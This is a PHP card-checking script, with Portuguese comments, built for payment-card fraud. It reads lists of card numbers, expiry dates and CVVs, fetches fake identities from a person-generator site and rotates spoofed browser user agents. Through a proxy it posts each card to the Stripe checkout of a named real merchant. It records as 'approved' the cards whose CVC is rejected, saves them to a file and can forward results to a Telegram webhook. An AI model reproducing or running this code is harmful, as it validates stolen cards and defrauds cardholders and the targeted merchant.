<?php
$proxy = isset($proxy) ? $proxy : "";
$proxyAuth = isset($proxyAuth) ? $proxyAuth : "";
$brandd = isset($brandd) ? $brandd : "";
$bandeira = isset($bandeira) ? $bandeira : "";
$banco = isset($banco) ? $banco : "";
$chatId = isset($chatId) ? $chatId : "";
$message = isset($message) ? $message : "";
$url = isset($url) ? $url : "";

///// acho que tem que colcoar proxy 🕊️ vê vocês bota ai ner////

///COLOCAR PROXY !!!!!/////
@unlink('cookies.txt');

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

  if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
  die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning"></span><br>');
  }

  $lista = $lista[0];
  $cc = explode("|", $lista)[0];
  $mes = explode("|", $lista)[1];
  $ano = explode("|", $lista)[2];
  $cvv = explode("|", $lista)[3];

  function puxar($separa, $inicia, $fim, $contador){
    $nada = explode($inicia, $separa);
    $nada = explode($fim, $nada[$contador]);
    return $nada[0];
  }

  function getStr($string, $start, $end) {
   $str = explode($start, $string);
   $str = explode($end, $str[1]);  
   return $str[0];
  }

  function multiexplode($string) {
   $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<", " ");
   $one = str_replace($delimiters, $delimiters[0], $string);
   $two = explode($delimiters[0], $one);
   return $two;
  }

  extract($_GET);
  $lista = str_replace(" " , "|", $lista);
  $lista = str_replace("%20", "|", $lista);
  $lista = preg_replace('/[ -]+/' , '-' , $lista);
  $lista = str_replace("/" , "|", $lista);
  $separar = explode("|", $lista);
  $cc = $separar[0];
  $mes = $separar[1];
  $ano = $separar[2];
  $cvv = $separar[3];
  $lista = ("$cc|$mes|$ano|$cvv");

  switch($ano){
  case 2030: $ano = "2030"; break;
  case 2031: $ano = "2031"; break;
  case 2021: $ano = "2021"; break;
  case 2022: $ano = "2022"; break;
  case 2023: $ano = "2023"; break;
  case 2024: $ano = "2024"; break;
  case 2025: $ano = "2025"; break;
  case 2026: $ano = "2026"; break;
  case 2027: $ano = "2027"; break;
  case 2028: $ano = "2028"; break;
  case 2029: $ano = "2029"; break;
  case 2030: $ano = "2030"; break;
  case 2031: $ano = "2031"; break;
  case 2032: $ano = "2032"; break;
  }



  switch($mes){
  case 1: $mes = "01"; break;
  case 2: $mes = "02"; break;
  case 3: $mes = "03"; break;
  case 4: $mes = "04"; break;
  case 5: $mes = "05"; break;
  case 6: $mes = "06"; break;
  case 7: $mes = "07"; break;
  case 8: $mes = "08"; break;
  case 9: $mes = "09"; break;
  }


if(strlen($ano) == 4){
    $ano2 = substr($ano, -4);}
    else{
    $ano2 = substr($ano, 4);

}
if(strlen($mes) == 1){
    $mes = "0".$mes;
}
function generateUserAgent() {
    $windowsVersions = ["NT 5.1", "NT 6.0", "NT 6.1", "NT 6.2", "NT 6.3", "NT 10.0"];
    $webkitVersion = rand(111, 999) . '.' . rand(11, 99);
    $chromeVersion = rand(11, 99) . '.0.' . rand(1111, 9999) . '.' . rand(111, 999);
    $safariVersion = rand(111, 999) . '.' . rand(11, 99);
    $iosVersion = rand(14, 15) . '_' . rand(0, 9);

    $userAgents = [
        "Mozilla/5.0 (Windows " . $windowsVersions[array_rand($windowsVersions)] . "; Win64; x64) AppleWebKit/$webkitVersion (KHTML, like Gecko) Chrome/$chromeVersion Safari/$safariVersion",
        "Mozilla/5.0 (Windows " . $windowsVersions[array_rand($windowsVersions)] . "; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
        "Mozilla/5.0 (Windows " . $windowsVersions[array_rand($windowsVersions)] . "; Win64; x64) AppleWebKit/$webkitVersion (KHTML, like Gecko) Edge/88.0.$(64-bit)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/$webkitVersion (KHTML, like Gecko) Chrome/$chromeVersion Safari/$safariVersion",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/$webkitVersion (KHTML, like Gecko) Chrome/$chromeVersion Safari/$safariVersion",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/$webkitVersion (KHTML, like Gecko) Version/13.1.2 Safari/$safariVersion",
        "Mozilla/5.0 (iPhone; CPU iPhone OS $iosVersion like Mac OS X) AppleWebKit/$webkitVersion (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/$safariVersion",
        "Mozilla/5.0 (iPad; CPU OS $iosVersion like Mac OS X) AppleWebKit/$webkitVersion (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/$safariVersion",
        "Mozilla/5.0 (Linux; Android " . rand(9, 12) . "; SM-G960U) AppleWebKit/$webkitVersion (KHTML, like Gecko) Chrome/$chromeVersion Mobile Safari/$safariVersion",
    ];

    return $userAgents[array_rand($userAgents)];
}
$userAgent = generateUserAgent();

$inicio = microtime(true);

$ch = curl_init('https://www.invertexto.com/gerador-de-pessoas');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query( 
       [
    'gender' => '',
    'country' => 'US'
]));
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$resp = curl_exec($ch);
preg_match_all('/<label>([^<]+)<\/label>\s*<input[^>]*value="([^"]*)"/', $resp, $matches, PREG_SET_ORDER);

$cep = $nome = $celular = $email = $street = $cidade = $estado = $cidade = '';

foreach($matches as $match) {
    $label = trim($match[1]);
    $value = $match[2];

    if (stripos($label, 'Telefone') !== false) {
        $celular = $value;
    } elseif (stripos($label, 'E-Mail') !== false) {
        $email = $value;
    } elseif (stripos($label, 'Nome') !== false) {
        $nome = $value;
    } elseif (stripos($label, 'Cidade') !== false) {
        $cidade = $value;
    } elseif (stripos($label, 'Estado') !== false) {
        $estado = $value;
    } elseif (stripos($label, 'Endereço') !== false) {
        $street = $value;
    } elseif (stripos($label, 'CEP') !== false) {
        $cep = $value;
    }
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://provechofss.com/food-handlers/cart');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: provechofss.com',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'referer: https://provechofss.com/food-handlers',
    'upgrade-insecure-requests: 1',
    'user-agent: ' . $userAgent
]);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
$respo = curl_exec($ch);

preg_match('/XSRF-TOKEN\s+(.*)/', @file_get_contents('cookies.txt'), $matches);

$token = isset($matches[1]) ? $matches[1] : '';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://provechofss.com/api/v1/checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: provechofss.com',
    'accept: */*',
    'content-type: application/json;charset=UTF-8',
    'origin: https://provechofss.com',
    'referer: https://provechofss.com/food-handlers/cart',
    'user-agent: ' . $userAgent,
    'x-requested-with: XMLHttpRequest',
    'x-xsrf-token: ' . urldecode($token)
]);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"funnel_id":"2","page_id":"5","user":{"first_name":"Gabriel","last_name":"Bianchi","email":"'.$email.'","phone_number":"'.$celular.'"},"lead":null,"billing_address":{"id":null,"line":"'.$street.'","city":"'.$cidade.'","country":"US","state":"'.$estado.'","zip_code":"'.$cep.'"},"shipping_address":{"id":null,"line":"'.$street.'","city":"'.$cidade.'","country":"US","state":"'.$estado.'","zip_code":"'.$cep.'"},"coupon":null,"card":{"number":"'.$cc.'","cvc":"'.$cvv.'","exp_month":"'.$mes.'","exp_year":'.$ano.'},"number":"'.$celular.'","note":null,"products":[],"offers":[1],"shipping":null,"ship":true,"gateway":"stripe_3","source":"funnel","call":{"sid":null},"lead_tags":"Customer,Customer | Food Handler","lead_list":"1","invoice_token":null}');

$retorno = curl_exec($ch);

$fim = microtime(true);
$tempoDeResposta = number_format($fim - $inicio, 2);



if (strpos($retorno, 'security code is incorrect') !== false) {
    echo "<span class='badge badge-success'>Aprovada</span> <span class='text-success'>$lista</span></b> » <b>Retorno: <span class='text-success'>Your card's security code is incorrect.</span></b> <b>$brandd $bandeira $banco | Tempo: ($tempoDeResposta SEG) » <span class='badge badge-success'></span> <br></b>";
    
    $aprovado = [
        "cartao" => "$cc|$mes|$ano|$cvv",
        "mensagem" => "Your card's security code is incorrect.",
    ];
    file_put_contents("aprovados.json", json_encode($aprovado, JSON_PRETTY_PRINT) . "\n", FILE_APPEND);



} elseif (strpos($retorno, 'Your card was declined') !== false) {
    echo "<span class='badge badge-danger'>Reprovada</span> <span class='text-danger'>$lista</span></b> » <b>Retorno: <span class='text-danger'>$retorno</span></b> » <b> $brandd $bandeira $banco | Tempo: ($tempoDeResposta SEG) » <span class='badge badge-danger'></span> <br></b>";
    
    // Aqui você pode adicionar lógica para enviar uma mensagem ao Telegram se necessário

} else {
    echo "<span class='badge badge-danger'>Error</span> <span class='text-danger'>$lista</span></b> » <b>Retorno: <span class='text-danger'>$retorno</span></b> » <b> $brandd $bandeira $banco | Tempo: ($tempoDeResposta SEG) » <span class='badge badge-danger'></span> <br></b>";
    
    // Aqui você pode adicionar lógica para enviar uma mensagem ao Telegram se necessário
}



    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    $context  = stream_context_create($options);
    if (!empty($url)) file_get_contents($url, false, $context);




die();
?>